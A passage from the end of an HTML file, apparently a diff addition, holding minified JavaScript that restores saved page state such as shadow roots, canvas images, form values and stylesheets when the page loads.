i++) { d.adoptedStyleSheets.push(asl[l[i]]); } e.removeAttribute(k8); } }, fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s, m; while (i--) { e = E[i]; s = e.shadowRoot; if ($s && (d = e.getAttribute(k1))) { if (!s) { try { s = e.attachShadow({ mode: (m = e.getAttribute(k10)) !== null ? m : 'open', clonable: e.hasAttribute(k11), delegatesFocus: e.hasAttribute(k12), serializable: e.hasAttribute(k13), slotAssignment: (m = e.getAttribute(k14)) !== null ? m : void (0), }); s.innerHTML = d; } catch (ex) { console.error(ex); } } e.removeAttribute(k1); e.removeAttribute(k10); e.removeAttribute(k11); e.removeAttribute(k12); e.removeAttribute(k13); e.removeAttribute(k14); } if ($c && (d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if ($sa && (d = e.getAttribute(k15)) !== null) { sle.push({ elem: e, value: d }); e.removeAttribute(k15); } if ($sa && (d = e.getAttribute(k16)) !== null) { sls[d] = e; e.removeAttribute(k16); } if (s) { slt(e); as(s, e); fn(s); } } }; as(d, r); fn(d); sl(); })()</script>
+</body>
+
+</html>
